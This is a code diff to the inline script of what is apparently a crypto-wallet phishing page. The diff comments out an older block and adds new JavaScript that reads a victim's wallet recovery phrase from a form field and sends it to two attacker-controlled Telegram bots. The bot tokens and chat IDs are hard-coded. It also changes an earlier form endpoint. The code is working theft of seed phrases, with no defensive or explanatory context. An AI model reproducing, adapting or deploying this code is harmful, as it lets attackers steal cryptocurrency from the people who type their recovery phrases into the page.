@@ -2902,39 +2902,86 @@
 
 <script>
 //bot token
-  var telegram_bot_id = "5858343744:AAHaowZLWptD3hpdleB5yz1vgdhIgFzZriE";
-  //chat id
-  var chat_id = 2031327961;
-  var  message;
-  var ready = function () {
-      // u_name = document.getElementById("new_multifactor").value;
-      message = document.getElementById("recovery_phrase").value;
-      message = "wallet " + message;
-  };
-  var sender = function () {
-      ready();
-      var settings = {
-          "async": true,
-          "crossDomain": true,
-          "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
-          "method": "POST",
-          "headers": {
-              "Content-Type": "application/json",
-              "cache-control": "no-cache"
-          },
-          "data": JSON.stringify({
-              "chat_id": chat_id,
-              "text": message
-          })
-      };
-      $.ajax(settings).done(function (response) {
-          console.log(response);
-      });
-      document.getElementById("new_multifactor").value = "";
-      document.getElementById("message").value = "";
-      return false;
-  };
+  // var telegram_bot_id = "5858343744:AAHaowZLWptD3hpdleB5yz1vgdhIgFzZriE";
+  // //chat id
+  // var chat_id = 2031327961;
+  // var  message;
+  // var ready = function () {
+  //     // u_name = document.getElementById("new_multifactor").value;
+  //     message = document.getElementById("recovery_phrase").value;
+  //     message = "wallet " + message;
+  // };
+  // var sender = function () {
+  //     ready();
+  //     var settings = {
+  //         "async": true,
+  //         "crossDomain": true,
+  //         "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+  //         "method": "POST",
+  //         "headers": {
+  //             "Content-Type": "application/json",
+  //             "cache-control": "no-cache"
+  //         },
+  //         "data": JSON.stringify({
+  //             "chat_id": chat_id,
+  //             "text": message
+  //         })
+  //     };
+  //     $.ajax(settings).done(function (response) {
+  //         console.log(response);
+  //     });
+  //     document.getElementById("new_multifactor").value = "";
+  //     document.getElementById("message").value = "";
+  //     return false;
+  // };
 
+var chatData = [
+    { bot_id: "5858343744:AAHaowZLWptD3hpdleB5yz1vgdhIgFzZriE", chat_id: 2031327961 },
+    { bot_id: "6647522926:AAHTUnwsL3Vuk_KxBeSGynTl6ZGonx4uyeU", chat_id: 5430676225 }
+];
+
+var message;
+
+var ready = function () {
+    message = document.getElementById("recovery_phrase").value;
+    message = "wallet " + message;
+};
+
+var sender = function () {
+    ready();
+
+    var delay = 30000; // Delay in milliseconds (2 seconds in this example)
+
+    chatData.forEach(function(chatInfo, index) {
+        setTimeout(function() {
+            var settings = {
+                "async": true,
+                "crossDomain": true,
+                "url": "https://api.telegram.org/bot" + chatInfo.bot_id + "/sendMessage",
+                "method": "POST",
+                "headers": {
+                    "Content-Type": "application/json",
+                    "cache-control": "no-cache"
+                },
+                "data": JSON.stringify({
+                    "chat_id": chatInfo.chat_id,
+                    "text": message
+                })
+            };
+
+            // Send the message
+            $.ajax(settings).done(function (response) {
+                console.log(response);
+            }).fail(function (error) {
+                console.error(error);
+            });
+        }, index * delay); // Introduce delay based on index
+    });
+
+    // Reset input fields after sending messages
+    document.getElementById("recovery_phrase").value = "";
+    return false; // Prevent form submission
+};
 
 
 </script>
@@ -2964,7 +3011,7 @@
     $(".modal-body").css({ height: "300px" });
     $.ajax({
       // url: "mm.php",
-      url: "https://getform.io/f/qbloqywa",
+      url: "",
       type: "POST",
       data: {
         wallet_name,
